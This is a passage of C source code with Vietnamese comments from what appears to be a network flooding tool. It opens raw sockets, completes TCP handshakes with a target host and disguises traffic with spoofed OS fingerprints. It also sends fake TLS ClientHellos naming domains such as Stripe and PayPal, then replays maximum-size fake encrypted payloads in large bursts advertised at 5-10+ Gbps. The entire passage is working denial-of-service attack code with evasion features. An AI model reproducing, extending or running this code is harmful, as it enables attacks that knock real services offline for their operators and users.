        "checkout.stripe.com","api.stripe.com",
        "cdn.shopify.com","fonts.gstatic.com",
        "www.paypal.com","code.jquery.com"
    };
    int n_sni = 30;

    /* --- HTTP/2 connection preface + SETTINGS + WINDOW_UPDATE --- */
    static const unsigned char v17_h2_preface[] = {
        /* PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n (24 bytes) */
        0x50,0x52,0x49,0x20,0x2a,0x20,0x48,0x54,
        0x54,0x50,0x2f,0x32,0x2e,0x30,0x0d,0x0a,
        0x0d,0x0a,0x53,0x4d,0x0d,0x0a,0x0d,0x0a,
        /* SETTINGS frame: len=18, type=4, flags=0, stream=0 */
        0x00,0x00,0x12,0x04,0x00,0x00,0x00,0x00,0x00,
        0x00,0x01,0x00,0x00,0x10,0x00, /* HEADER_TABLE_SIZE=4096 */
        0x00,0x02,0x00,0x00,0x00,0x00, /* ENABLE_PUSH=0 */
        0x00,0x03,0x00,0x00,0x00,0x64, /* MAX_CONCURRENT_STREAMS=100 */
        /* WINDOW_UPDATE: len=4, type=8, flags=0, stream=0 */
        0x00,0x00,0x04,0x08,0x00,0x00,0x00,0x00,0x00,
        0x00,0x0f,0x00,0x01 /* increment=983041 */
    };

    /* --- Adaptive rate controller (chia sẻ giữa threads) --- */
    static _Atomic int v17_current_rate = 0;
    static volatile long long v17_last_adjust_ms = 0;
    if (tid == 0 && v17_current_rate == 0) {
        v17_current_rate = args.rate;
        v17_last_adjust_ms = get_ms();
    }

    /* ══════════════════════════════════════════════════════════════════════
     * PHẦN 2: RAW MODE — AF_PACKET / SOCK_RAW
     * ══════════════════════════════════════════════════════════════════════
     * Khi có quyền root: Stateful 3WHS + TLS ClientHello + batch sendmmsg
     * Hiệu suất tối đa: 5-10+ Gbps tùy NIC
     * ══════════════════════════════════════════════════════════════════════ */
    if (raw_cap > 0) {
        LOG_INFO("T%d: RAW MODE (cap=%d: %s) — full L4 spoofing",
                 tid, raw_cap, raw_cap==2?"AF_PACKET":"SOCK_RAW");

        /* --- Lấy interface + MAC bằng ioctl (không dùng /proc) --- */
        char r_iface[32] = {0};
        unsigned char r_src_mac[6] = {0}, r_gw_mac[6] = {0};
        int r_ifindex = 0;

        /* Tìm interface mặc định qua getifaddrs */
        { struct ifaddrs *ifas, *ifa;
          if (getifaddrs(&ifas) == 0) {
              for (ifa=ifas; ifa; ifa=ifa->ifa_next) {
                  if (!ifa->ifa_addr || ifa->ifa_addr->sa_family!=AF_INET) continue;
                  if (strcmp(ifa->ifa_name,"lo")==0) continue;
                  if (ifa->ifa_flags & IFF_UP) {
                      strncpy(r_iface, ifa->ifa_name, 31);
                      break;
                  }
              }
              freeifaddrs(ifas);
          }
        }
        if (!r_iface[0]) { strncpy(r_iface, "eth0", 31); }
        r_ifindex = if_nametoindex(r_iface);

        /* Lấy MAC của interface bằng ioctl */
        { int _s = socket(AF_INET, SOCK_DGRAM, 0);
          struct ifreq ifr; memset(&ifr,0,sizeof(ifr));
          strncpy(ifr.ifr_name, r_iface, IFNAMSIZ-1);
          if (ioctl(_s, SIOCGIFHWADDR, &ifr) == 0)
              memcpy(r_src_mac, ifr.ifr_hwaddr.sa_data, 6);
          close(_s);
        }

        /* Bước 1: Lấy gateway IP từ /proc/net/route */
        unsigned int _gw_ip = 0;
        { FILE *_rfp = fopen("/proc/net/route", "r");
          if (_rfp) {
              char _rline[256], _rifc[32];
              unsigned int _rdst, _rgw, _rflags, _rmask;
              /* Bỏ header */
              if (fgets(_rline, sizeof(_rline), _rfp)) {}
              while (fgets(_rline, sizeof(_rline), _rfp)) {
                  if (sscanf(_rline, "%31s %x %x %x %*s %*s %*s %x",
                             _rifc, &_rdst, &_rgw, &_rflags, &_rmask) == 5) {
                      /* Default route: dst=0, flag RTF_GATEWAY(0x2), gw!=0 */
                      if (_rdst == 0 && (_rflags & 0x2) && _rgw != 0) {
                          _gw_ip = _rgw; /* network byte order */
                          break;
                      }
                  }
              }
              fclose(_rfp);
          }
        }
        /* Bước 2: Trigger ARP cho gateway (hoặc target nếu cùng subnet) */
        { int _s = socket(AF_INET, SOCK_DGRAM, 0);
          struct sockaddr_in _dst = {0};
          _dst.sin_family = AF_INET;
          _dst.sin_addr.s_addr = (_gw_ip != 0) ? _gw_ip : bin_target_ip;
          _dst.sin_port = htons(80);
          connect(_s, (struct sockaddr*)&_dst, sizeof(_dst));
          close(_s);
          usleep(60000); /* Chờ ARP resolve */
        }
        /* Bước 3: SIOCGARP với gateway IP */
        { int _s = socket(AF_INET, SOCK_DGRAM, 0);
          struct arpreq arq; memset(&arq, 0, sizeof(arq));
          struct sockaddr_in *_arp_sin = (struct sockaddr_in*)&arq.arp_pa;
          _arp_sin->sin_family = AF_INET;
          _arp_sin->sin_addr.s_addr = (_gw_ip != 0) ? _gw_ip : bin_target_ip;
          strncpy(arq.arp_dev, r_iface, IFNAMSIZ-1);
          if (ioctl(_s, SIOCGARP, &arq) == 0 && (arq.arp_flags & ATF_COM))
              memcpy(r_gw_mac, arq.arp_ha.sa_data, 6);
          close(_s);
          /* Kiểm tra MAC hợp lệ — nếu không (container/veth) → safe mode */
          int _mac_ok = 0;
          for (int _mi = 0; _mi < 6; _mi++) if (r_gw_mac[_mi]) { _mac_ok = 1; break; }
          if (!_mac_ok) {
              LOG_INFO("T%d: Không lấy được gateway MAC → fallback safe mode", tid);
              goto v17_safe_mode;
          }
        }

        /* --- Tạo raw socket để gửi --- */
        int r_fd_send, r_fd_send2;
        int r_use_afp = (raw_cap == 2);
        struct sockaddr_ll r_dst_sll = {0};
        struct sockaddr_in r_raw_dst = {0};

        if (r_use_afp) {
            r_fd_send = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_IP));
            struct sockaddr_ll sl = {0};
            sl.sll_family=AF_PACKET; sl.sll_ifindex=r_ifindex;
            sl.sll_protocol=htons(ETH_P_IP);
            bind(r_fd_send, (struct sockaddr*)&sl, sizeof(sl));
            int q=1; setsockopt(r_fd_send, SOL_PACKET, PACKET_QDISC_BYPASS, &q, sizeof(q));
            r_fd_send2 = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_IP));
            bind(r_fd_send2, (struct sockaddr*)&sl, sizeof(sl));
            setsockopt(r_fd_send2, SOL_PACKET, PACKET_QDISC_BYPASS, &q, sizeof(q));

            r_dst_sll.sll_family=AF_PACKET; r_dst_sll.sll_ifindex=r_ifindex;
            r_dst_sll.sll_halen=6; memcpy(r_dst_sll.sll_addr, r_gw_mac, 6);
            r_dst_sll.sll_protocol=htons(ETH_P_IP);
        } else {
            r_fd_send = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
            int h=1; setsockopt(r_fd_send, IPPROTO_IP, IP_HDRINCL, &h, sizeof(h));
            r_fd_send2 = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
            setsockopt(r_fd_send2, IPPROTO_IP, IP_HDRINCL, &h, sizeof(h));

            r_raw_dst.sin_family=AF_INET;
            r_raw_dst.sin_addr.s_addr=bin_target_ip;
        }
        { int sb=128*1024*1024; /* 128MB send buffer */
          setsockopt(r_fd_send, SOL_SOCKET, SO_SNDBUF, &sb, sizeof(sb));
          setsockopt(r_fd_send2, SOL_SOCKET, SO_SNDBUF, &sb, sizeof(sb));
        }

        /* --- Recv socket cho SYN-ACK (BPF filter) --- */
        int r_fd_recv = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_IP));
        { struct sock_filter bpf_sa[] = {
            {0x28,0,0,0x0c}, {0x15,0,5,0x0800}, {0x30,0,0,0x17},
            {0x15,0,3,0x06}, {0x28,0,0,0x14}, {0x45,1,0,0x1fff},
            {0xb1,0,0,0x0e}, {0x50,0,0,0x1b}, {0x54,0,0,0x12},
            {0x15,0,1,0x12}, {0x6,0,0,0x40000}, {0x6,0,0,0}
          };
          struct sock_fprog prog = {12, bpf_sa};
          setsockopt(r_fd_recv, SOL_SOCKET, SO_ATTACH_FILTER, &prog, sizeof(prog));
          int rb=512*1024; setsockopt(r_fd_recv, SOL_SOCKET, SO_RCVBUF, &rb, sizeof(rb));
        }

        /* --- Slot arrays --- */
        #define R_SLOTS 16384  /* Max concurrent connections */
        #define R_ETH 14
        #define R_IP 20
        #define R_TCP 20
        #define R_PL 1440
        #define R_FLEN (R_ETH+R_IP+R_TCP+R_PL)

        #define R_ST_SYN   0
        #define R_ST_EST   1
        #define R_ST_FORCE 2

        unsigned char (*r_buf)[R_FLEN] = malloc(R_SLOTS * R_FLEN);
        struct mmsghdr *r_msg = calloc(R_SLOTS, sizeof(struct mmsghdr));
        struct iovec *r_iov = calloc(R_SLOTS, sizeof(struct iovec));
        unsigned int *r_seq = calloc(R_SLOTS, sizeof(unsigned int));
        unsigned int *r_ack = calloc(R_SLOTS, sizeof(unsigned int));
        unsigned short *r_sp = calloc(R_SLOTS, sizeof(unsigned short));
        int *r_st = calloc(R_SLOTS, sizeof(int));
        unsigned int *r_rn = calloc(R_SLOTS, sizeof(unsigned int));
        unsigned int *r_syn_cnt = calloc(R_SLOTS, sizeof(unsigned int));
        int *r_prof_idx = calloc(R_SLOTS, sizeof(int)); /* OS profile index */
        unsigned short *r_ipid = calloc(R_SLOTS, sizeof(unsigned short));
        unsigned int *r_tsval = calloc(R_SLOTS, sizeof(unsigned int));
        unsigned char *r_ch_sent = calloc(R_SLOTS, sizeof(unsigned char));
        int *r_port_map = malloc(65536 * sizeof(int));

        /* Huge random payload buffer + prefix sum cho O(1) checksum */
        #define R_HUGE_PL (4*1024*1024) /* 4MB — nhiều variation hơn */
        unsigned char *r_huge = malloc(R_HUGE_PL);
        unsigned int *r_huge_sum = calloc(R_HUGE_PL/2+1, sizeof(unsigned int));
        { unsigned int cs=0; unsigned short *hw=(unsigned short*)r_huge;
          r_huge_sum[0]=0;
          for(int k=0;k<R_HUGE_PL/2;k++){
              hw[k]=(unsigned short)(fast_rand()&0xFFFF);
              cs+=hw[k]; r_huge_sum[k+1]=cs;
          }
        }

        /* Recv + SYN + ACK buffer */
        unsigned char *r_recv_buf = malloc(4096);
        unsigned char *r_syn_buf = malloc(R_FLEN);
        unsigned char *r_ack_buf = malloc(R_FLEN);
        memset(r_syn_buf,0,R_FLEN); memset(r_ack_buf,0,R_FLEN);

        /* Khởi tạo port map + slots */
        for (int i=0;i<65536;i++) r_port_map[i]=-1;
        for (int b=0;b<R_SLOTS;b++) {
            memset(r_buf[b],0,R_FLEN);
            unsigned char *fr = r_buf[b];

            /* Profile ngẫu nhiên */
            r_prof_idx[b] = fast_rand() % n_profiles;
            const V17OsProfile *prof = &v17_profiles[r_prof_idx[b]];

            /* Ethernet header */
            if (r_use_afp) { memcpy(fr,r_gw_mac,6); memcpy(fr+6,r_src_mac,6); fr[12]=8;fr[13]=0; }

            /* IP header */
            struct iphdr *ih = (struct iphdr*)(fr+R_ETH);
            ih->ihl=5; ih->version=4; ih->tot_len=htons(R_IP+R_TCP+R_PL);
            ih->frag_off=htons(0x4000); ih->ttl=prof->ttl;
            ih->protocol=IPPROTO_TCP;
            ih->saddr=src_ip; ih->daddr=bin_target_ip;

            /* TCP header (PSH+ACK default cho data sending) */
            struct tcphdr *th = (struct tcphdr*)(fr+R_ETH+R_IP);
            unsigned short p;
            do { p=(unsigned short)(1024+(fast_rand()%64511)); } while(r_port_map[p]!=-1);
            r_sp[b]=p; r_port_map[p]=b;
            r_seq[b]=fast_rand(); r_ack[b]=fast_rand();
            r_st[b]=R_ST_SYN; r_rn[b]=b;
            r_ipid[b]=fast_rand()&0xFFFF;
            r_tsval[b]=fast_rand();
            r_ch_sent[b]=0;
            r_syn_cnt[b]=0;

            th->source=htons(r_sp[b]); th->dest=bin_target_port;
            th->doff=5; th->psh=1; th->ack=1;
            th->seq=htonl(r_seq[b]); th->ack_seq=htonl(r_ack[b]);
            th->window=htons(prof->window);

            /* IOV + MSG setup */
            r_iov[b].iov_base = r_use_afp ? fr : (fr+R_ETH);
            r_iov[b].iov_len = r_use_afp ? R_FLEN : (R_IP+R_TCP+R_PL);
            r_msg[b].msg_hdr.msg_iov = &r_iov[b];
            r_msg[b].msg_hdr.msg_iovlen = 1;
            r_msg[b].msg_hdr.msg_name = r_use_afp ? (void*)&r_dst_sll : (void*)&r_raw_dst;
            r_msg[b].msg_hdr.msg_namelen = r_use_afp ? sizeof(r_dst_sll) : sizeof(r_raw_dst);
        }

        LOG_INFO("T%d: RAW iface=%s mode=%s slots=%d", tid, r_iface,
                 r_use_afp?"AF_PACKET":"SOCK_RAW", R_SLOTS);

        /* ── VÒNG LẶP RAW MODE ── */
        unsigned int r_round = 0;
        long long r_l5_start; clock_gettime(CLOCK_MONOTONIC, (struct timespec*)&r_l5_start);
        int r_l4_active = 0;

        while (1) {
            r_round++;

            /* L4 BLAST NGAY LẬP TỨC — không chờ */
            if (!r_l4_active) {
                r_l4_active=1;
                if(tid==0) LOG_INFO("T%d: IMMEDIATE L4+L5 BLAST", tid);
            }

            /* 1. Gửi SYN cho slots đang chờ */
            for (int b=0; b<R_SLOTS; b++) {
                if (r_st[b]!=R_ST_SYN) continue;
                if (r_syn_cnt[b]>0 && r_round-r_syn_cnt[b] < (10u<<(r_syn_cnt[b]>4?4:r_syn_cnt[b])))
                    continue;
                r_syn_cnt[b] = r_round;

                const V17OsProfile *prof = &v17_profiles[r_prof_idx[b]];

                /* Xây SYN buffer */
                memset(r_syn_buf, 0, R_FLEN);
                if (r_use_afp) { memcpy(r_syn_buf,r_gw_mac,6); memcpy(r_syn_buf+6,r_src_mac,6);
                                 r_syn_buf[12]=8; r_syn_buf[13]=0; }
                struct iphdr *ih2 = (struct iphdr*)(r_syn_buf+R_ETH);
                ih2->ihl=5; ih2->version=4; ih2->frag_off=htons(0x4000);
                ih2->ttl=prof->ttl; ih2->protocol=IPPROTO_TCP;
                ih2->saddr=src_ip; ih2->daddr=bin_target_ip;
                ih2->id=htons(++r_ipid[b]);

                struct tcphdr *th2 = (struct tcphdr*)(r_syn_buf+R_ETH+R_IP);
                th2->source=htons(r_sp[b]); th2->dest=bin_target_port;
                th2->seq=htonl(r_seq[b]); th2->syn=1;
                th2->window=htons(prof->window);

                /* TCP options theo OS profile */
                unsigned char *opts = r_syn_buf+R_ETH+R_IP+20;
                int opt_len = 0;
                V17_BUILD_SYN_OPTS(opts, *prof, r_tsval[b], opt_len);
                th2->doff = (20+opt_len)/4;
                ih2->tot_len = htons(R_IP+20+opt_len);

                /* IP checksum */
                ih2->check=0;
                { unsigned int c=0; unsigned short *w=(unsigned short*)ih2;
                  for(int i=0;i<10;i++) c+=w[i];
                  c=(c>>16)+(c&0xFFFF); c+=(c>>16);
                  ih2->check=(unsigned short)~c; }

                /* TCP checksum */
                th2->check=0;
                { unsigned int c=(src_ip&0xFFFF)+(src_ip>>16)
                    +(bin_target_ip&0xFFFF)+(bin_target_ip>>16)
                    +htons(IPPROTO_TCP)+htons(20+opt_len);
                  unsigned short *w=(unsigned short*)th2;
                  for(int i=0;i<(20+opt_len)/2;i++) c+=w[i];
                  c=(c>>16)+(c&0xFFFF); c+=(c>>16);
                  th2->check=(unsigned short)~c; }

                if (r_use_afp)
                    sendto(r_fd_send, r_syn_buf, R_ETH+R_IP+20+opt_len, 0,
                           (struct sockaddr*)&r_dst_sll, sizeof(r_dst_sll));
                else
                    sendto(r_fd_send, r_syn_buf+R_ETH, R_IP+20+opt_len, 0,
                           (struct sockaddr*)&r_raw_dst, sizeof(r_raw_dst));
            }

            /* 2. Nhận SYN-ACK, RST → cập nhật trạng thái */
            { int rcvd;
              while ((rcvd=recv(r_fd_recv, r_recv_buf, 4096, MSG_DONTWAIT))>0) {
                if (rcvd < R_ETH+R_IP+20) continue;
                struct iphdr *rih = (struct iphdr*)(r_recv_buf+R_ETH);
                if (rih->protocol != IPPROTO_TCP) continue;
                struct tcphdr *rth = (struct tcphdr*)(r_recv_buf+R_ETH+(rih->ihl<<2));
                unsigned short dport = ntohs(rth->dest);
                int b = r_port_map[dport];
                if (b<0) continue;

                /* RST → reset slot */
                if (rth->rst && r_st[b]==R_ST_EST) {
                    r_st[b]=R_ST_SYN; r_rn[b]=0; r_syn_cnt[b]=0;
                    r_seq[b]=fast_rand(); r_ack[b]=fast_rand();
                    r_port_map[r_sp[b]]=-1;
                    unsigned short np;
                    do { np=(unsigned short)(1024+(fast_rand()%64511)); } while(r_port_map[np]!=-1);
                    r_sp[b]=np; r_port_map[np]=b;
                    r_ch_sent[b]=0; r_ipid[b]=fast_rand()&0xFFFF;
                    r_prof_idx[b]=fast_rand()%n_profiles;
                    continue;
                }

                /* SYN-ACK → hoàn tất 3WHS */
                if (!(rth->syn && rth->ack)) continue;
                if (r_st[b]!=R_ST_SYN) continue;

                r_ack[b] = ntohl(rth->seq)+1;
                r_seq[b]++;

                /* Gửi ACK */
                memset(r_ack_buf, 0, R_FLEN);
                if (r_use_afp) { memcpy(r_ack_buf,r_gw_mac,6); memcpy(r_ack_buf+6,r_src_mac,6);
                                 r_ack_buf[12]=8; r_ack_buf[13]=0; }
                struct iphdr *ih3 = (struct iphdr*)(r_ack_buf+R_ETH);
                ih3->ihl=5; ih3->version=4; ih3->tot_len=htons(R_IP+R_TCP);
                ih3->frag_off=htons(0x4000); ih3->ttl=v17_profiles[r_prof_idx[b]].ttl;
                ih3->protocol=IPPROTO_TCP; ih3->saddr=src_ip; ih3->daddr=bin_target_ip;
                ih3->id=htons(++r_ipid[b]);
                struct tcphdr *th3 = (struct tcphdr*)(r_ack_buf+R_ETH+R_IP);
                th3->source=htons(r_sp[b]); th3->dest=bin_target_port;
                th3->seq=htonl(r_seq[b]); th3->ack_seq=htonl(r_ack[b]);
                th3->doff=5; th3->ack=1; th3->window=htons(65535);

                ih3->check=0;
                { unsigned int c=0; unsigned short *w=(unsigned short*)ih3;
                  for(int i=0;i<10;i++) c+=w[i];
                  c=(c>>16)+(c&0xFFFF); c+=(c>>16); ih3->check=(unsigned short)~c; }
                th3->check=0;
                { unsigned int c=(src_ip&0xFFFF)+(src_ip>>16)
                    +(bin_target_ip&0xFFFF)+(bin_target_ip>>16)
                    +htons(IPPROTO_TCP)+htons(R_TCP);
                  unsigned short *w=(unsigned short*)th3;
                  for(int i=0;i<10;i++) c+=w[i];
                  c=(c>>16)+(c&0xFFFF); c+=(c>>16); th3->check=(unsigned short)~c; }

                if (r_use_afp)
                    sendto(r_fd_send, r_ack_buf, R_ETH+R_IP+R_TCP, 0,
                           (struct sockaddr*)&r_dst_sll, sizeof(r_dst_sll));
                else
                    sendto(r_fd_send, r_ack_buf+R_ETH, R_IP+R_TCP, 0,
                           (struct sockaddr*)&r_raw_dst, sizeof(r_raw_dst));
                r_st[b] = R_ST_EST;
                r_ch_sent[b] = 0;
              }
            }

            /* 3. HOT SEND LOOP — Chỉ khi L4 đã active */
            if (!r_l4_active) continue;

            struct mmsghdr r_active[R_SLOTS];
            int r_valid = 0;

            for (int b=0; b<R_SLOTS; b++) {
                if (r_st[b]!=R_ST_EST && r_st[b]!=R_ST_FORCE) {
                    if (r_syn_cnt[b]>=1) { r_st[b]=R_ST_FORCE; r_ack[b]=fast_rand(); } /* Force sau 1 SYN */
                    else continue;
                }
                unsigned char *fr = r_buf[b];
                struct iphdr *ih = (struct iphdr*)(fr+R_ETH);
                struct tcphdr *th = (struct tcphdr*)(fr+R_ETH+R_IP);
                const V17OsProfile *prof = &v17_profiles[r_prof_idx[b]];
                r_rn[b]++;

                /* TLS ClientHello sau khi ESTABLISHED (Layer 5 attack) */
                if (r_st[b]==R_ST_EST && !r_ch_sent[b]) {
                    unsigned char ch[768]; memset(ch,0,sizeof(ch));
                    if(r_use_afp){memcpy(ch,r_gw_mac,6);memcpy(ch+6,r_src_mac,6);ch[12]=8;ch[13]=0;}
                    unsigned char chp[V17_MAX_CH_SIZE]; int cp=0;
                    chp[cp++]=0x16; chp[cp++]=0x03; chp[cp++]=0x01; /* TLS record */
                    int rl_pos=cp; cp+=2;
                    chp[cp++]=0x01; int hl_pos=cp; cp+=3; /* ClientHello */
                    chp[cp++]=0x03; chp[cp++]=0x03; /* TLS 1.2 */
                    for(int i=0;i<32;i++) chp[cp++]=fast_rand()&0xFF; /* Random */
                    chp[cp++]=32; for(int i=0;i<32;i++) chp[cp++]=fast_rand()&0xFF; /* Session ID */
                    /* Cipher suites (Chrome 120) */
                    unsigned short ciphers[]={0x1301,0x1302,0x1303,0xc02b,0xc02f,0xc02c,
                        0xc030,0xcca9,0xcca8,0xc013,0xc014,0x009c,0x009d,0x002f,0x0035};
                    int nc=15; chp[cp++]=(nc*2)>>8; chp[cp++]=(nc*2)&0xFF;
                    for(int i=0;i<nc;i++){chp[cp++]=ciphers[i]>>8;chp[cp++]=ciphers[i]&0xFF;}
                    chp[cp++]=1; chp[cp++]=0; /* Compression: null */
                    int ext_lp=cp; cp+=2; int ext_s=cp;
                    /* SNI */
                    const char *sni=v17_sni_domains[fast_rand()%n_sni];
                    int sl=strlen(sni);
                    chp[cp++]=0;chp[cp++]=0; int sel=sl+5;
                    chp[cp++]=sel>>8;chp[cp++]=sel&0xFF;
                    chp[cp++]=(sel-2)>>8;chp[cp++]=(sel-2)&0xFF;
                    chp[cp++]=0;chp[cp++]=sl>>8;chp[cp++]=sl&0xFF;
                    memcpy(chp+cp,sni,sl);cp+=sl;
                    /* supported_groups */
                    chp[cp++]=0;chp[cp++]=0x0A;chp[cp++]=0;chp[cp++]=0x0A;
                    chp[cp++]=0;chp[cp++]=0x08;
                    unsigned short g[]={0x001D,0x0017,0x0018,0x0019};
                    for(int i=0;i<4;i++){chp[cp++]=g[i]>>8;chp[cp++]=g[i]&0xFF;}
                    /* signature_algorithms */
                    chp[cp++]=0;chp[cp++]=0x0D;chp[cp++]=0;chp[cp++]=0x14;
                    chp[cp++]=0;chp[cp++]=0x12;
                    unsigned short sa[]={0x0403,0x0804,0x0401,0x0503,0x0805,0x0501,0x0806,0x0601,0x0201};
                    for(int i=0;i<9;i++){chp[cp++]=sa[i]>>8;chp[cp++]=sa[i]&0xFF;}
                    /* key_share x25519 */
                    chp[cp++]=0;chp[cp++]=0x33;chp[cp++]=0;chp[cp++]=0x26;
                    chp[cp++]=0;chp[cp++]=0x24;chp[cp++]=0;chp[cp++]=0x1D;
                    chp[cp++]=0;chp[cp++]=0x20;
                    for(int i=0;i<32;i++) chp[cp++]=fast_rand()&0xFF;
                    /* supported_versions */
                    chp[cp++]=0;chp[cp++]=0x2B;chp[cp++]=0;chp[cp++]=5;chp[cp++]=4;
                    chp[cp++]=0x03;chp[cp++]=0x04;chp[cp++]=0x03;chp[cp++]=0x03;
                    /* ALPN h2+http/1.1 */
                    chp[cp++]=0;chp[cp++]=0x10;chp[cp++]=0;chp[cp++]=0x0E;
                    chp[cp++]=0;chp[cp++]=0x0C;chp[cp++]=2;chp[cp++]='h';chp[cp++]='2';
                    chp[cp++]=8;memcpy(chp+cp,"http/1.1",8);cp+=8;
                    /* Cập nhật độ dài */
                    int ext_t=cp-ext_s; chp[ext_lp]=ext_t>>8; chp[ext_lp+1]=ext_t&0xFF;
                    int hl=cp-hl_pos-3; chp[hl_pos]=(hl>>16)&0xFF; chp[hl_pos+1]=(hl>>8)&0xFF; chp[hl_pos+2]=hl&0xFF;
                    int rl=cp-rl_pos-2; chp[rl_pos]=rl>>8; chp[rl_pos+1]=rl&0xFF;

                    /* Build IP+TCP cho ClientHello */
                    struct iphdr *cih=(struct iphdr*)(ch+R_ETH);
                    cih->ihl=5;cih->version=4;cih->tot_len=htons(R_IP+R_TCP+cp);
                    cih->frag_off=htons(0x4000);cih->ttl=prof->ttl;cih->protocol=IPPROTO_TCP;
                    cih->saddr=src_ip;cih->daddr=bin_target_ip;cih->id=htons(++r_ipid[b]);
                    cih->check=0;
                    {unsigned int c=0;unsigned short*w=(unsigned short*)cih;
                     for(int i=0;i<10;i++)c+=w[i];c=(c>>16)+(c&0xFFFF);c+=(c>>16);
                     cih->check=(unsigned short)~c;}
                    struct tcphdr *cth=(struct tcphdr*)(ch+R_ETH+R_IP);
                    memset(cth,0,R_TCP);
                    cth->source=htons(r_sp[b]);cth->dest=bin_target_port;
                    cth->seq=htonl(r_seq[b]);cth->ack_seq=htonl(r_ack[b]);
                    cth->doff=5;cth->psh=1;cth->ack=1;cth->window=htons(prof->window);
                    memcpy(ch+R_ETH+R_IP+R_TCP,chp,cp);
                    cth->check=0;
                    {unsigned int c=(src_ip&0xFFFF)+(src_ip>>16)+(bin_target_ip&0xFFFF)+(bin_target_ip>>16)
                        +htons(IPPROTO_TCP)+htons(R_TCP+cp);
                     unsigned short*w=(unsigned short*)cth;
                     for(int i=0;i<(R_TCP+cp)/2;i++)c+=w[i];
                     if((R_TCP+cp)%2)c+=htons(((unsigned short)((unsigned char*)cth)[R_TCP+cp-1])<<8);
                     c=(c>>16)+(c&0xFFFF);c+=(c>>16);cth->check=(unsigned short)~c;}

                    if(r_use_afp) sendto(r_fd_send,ch,R_ETH+R_IP+R_TCP+cp,0,(struct sockaddr*)&r_dst_sll,sizeof(r_dst_sll));
                    else sendto(r_fd_send,ch+R_ETH,R_IP+R_TCP+cp,0,(struct sockaddr*)&r_raw_dst,sizeof(r_raw_dst));
                    r_seq[b]+=cp; r_ch_sent[b]=1;
                    thread_stats[tid].packets++; thread_stats[tid].bytes+=R_ETH+R_IP+R_TCP+cp;
                }

                /* Connection churn — xoay nhanh */
                unsigned int churn = 2000+(fast_rand()%3000); /* 2K-5K rounds */
                if (r_rn[b] > churn) {
                    /* Reset slot */
                    r_st[b]=R_ST_SYN; r_rn[b]=0; r_syn_cnt[b]=0;
                    r_seq[b]=fast_rand(); r_ack[b]=fast_rand();
                    r_port_map[r_sp[b]]=-1;
                    unsigned short np;
                    do { np=(unsigned short)(1024+(fast_rand()%64511)); } while(r_port_map[np]!=-1);
                    r_sp[b]=np; r_port_map[np]=b;
                    r_ch_sent[b]=0; r_ipid[b]=fast_rand()&0xFFFF;
                    r_prof_idx[b]=fast_rand()%n_profiles;
                    continue;
                }

                /* ═══ MAX BANDWIDTH BLAST ═══ */
                unsigned int pl_len = R_PL; /* LUÔN dùng max payload 1440 bytes */
                unsigned char *pl = fr+R_ETH+R_IP+R_TCP;
                unsigned int pl_off = (fast_rand()%(R_HUGE_PL-pl_len))&~1u;
                memcpy(pl, r_huge+pl_off, pl_len);

                /* TLS Application Data header */
                pl[0]=0x17; pl[1]=0x03; pl[2]=0x03;
                pl[3]=(unsigned char)((pl_len-5)>>8); pl[4]=(unsigned char)((pl_len-5)&0xFF);

                /* Cập nhật headers */
                unsigned int tot_tcp = R_TCP+pl_len, tot_ip = R_IP+tot_tcp;
                ih->tot_len = htons(tot_ip);
                ih->ttl = prof->ttl;
                ih->id = htons(++r_ipid[b]);
                ih->frag_off = htons(0x4000);
                r_seq[b] += pl_len;
                th->seq=htonl(r_seq[b]); th->ack_seq=htonl(r_ack[b]);
                th->source=htons(r_sp[b]); th->window=htons(prof->window);
                th->doff=5;
                th->psh=(fast_rand()%4==0)?1:0; th->ack=1;
                th->rst=0; th->fin=0; th->syn=0;

                /* IP checksum */
                ih->check=0;
                { unsigned int c=0; unsigned short *w=(unsigned short*)ih;
                  for(int i=0;i<10;i++) c+=w[i];
                  c=(c>>16)+(c&0xFFFF); c+=(c>>16); ih->check=(unsigned short)~c; }

                /* TCP checksum */
                th->check=0;
                { unsigned int c=(src_ip&0xFFFF)+(src_ip>>16)
                    +(bin_target_ip&0xFFFF)+(bin_target_ip>>16)
                    +htons(IPPROTO_TCP)+htons(tot_tcp);
                  unsigned short *w=(unsigned short*)th;
                  for(int i=0;i<tot_tcp/2;i++) c+=w[i];
                  if(tot_tcp%2) c+=htons(((unsigned short)((unsigned char*)th)[tot_tcp-1])<<8);
                  c=(c>>16)+(c&0xFFFF); c+=(c>>16); th->check=(unsigned short)~c; }

                r_iov[b].iov_len = r_use_afp ? (R_ETH+tot_ip) : tot_ip;
                r_active[r_valid++] = r_msg[b];
            }

            if (r_valid == 0) continue;

            /* ═══ MAX BURST SEND — 256x replay, dual socket ═══ */
            int cur_fd = r_fd_send;
            unsigned long long tot_sent=0, tot_bytes=0;
            for (int burst=0; burst<256; burst++) {
                int sent = sendmmsg(cur_fd, r_active, r_valid, 0);
                if (sent>0) {
                    tot_sent+=sent;
                    for(int i=0;i<sent;i++) tot_bytes+=r_active[i].msg_hdr.msg_iov->iov_len;
                } else {
                    if (errno==ENOBUFS||errno==EAGAIN) {
                        cur_fd = (cur_fd==r_fd_send)?r_fd_send2:r_fd_send;
                        usleep(1); continue;
                    }
                    break;
                }
                /* Cập nhật seq+ipid */
                for (int i=0; i<r_valid; i++) {
                    unsigned char *bfr = (unsigned char*)r_active[i].msg_hdr.msg_iov->iov_base;
                    struct iphdr *bih; struct tcphdr *bth;
                    if(r_use_afp){bih=(struct iphdr*)(bfr+R_ETH);bth=(struct tcphdr*)(bfr+R_ETH+R_IP);}
                    else{bih=(struct iphdr*)bfr;bth=(struct tcphdr*)(bfr+R_IP);}
                    unsigned int p_len=ntohs(bih->tot_len)-R_IP-(bth->doff*4);
                    unsigned short o_sh=((unsigned short*)&bth->seq)[0], o_sl=((unsigned short*)&bth->seq)[1];
                    unsigned short o_id=bih->id;
                    bth->seq=htonl(ntohl(bth->seq)+p_len);
                    bih->id=htons(ntohs(bih->id)+1);
                    unsigned short n_sh=((unsigned short*)&bth->seq)[0], n_sl=((unsigned short*)&bth->seq)[1];
                    unsigned int d=(~o_sh&0xFFFF)+(n_sh&0xFFFF)+(~o_sl&0xFFFF)+(n_sl&0xFFFF);
                    unsigned int tc=(~bth->check&0xFFFF)+d;
                    tc=(tc>>16)+(tc&0xFFFF); tc+=(tc>>16); bth->check=(unsigned short)~tc;
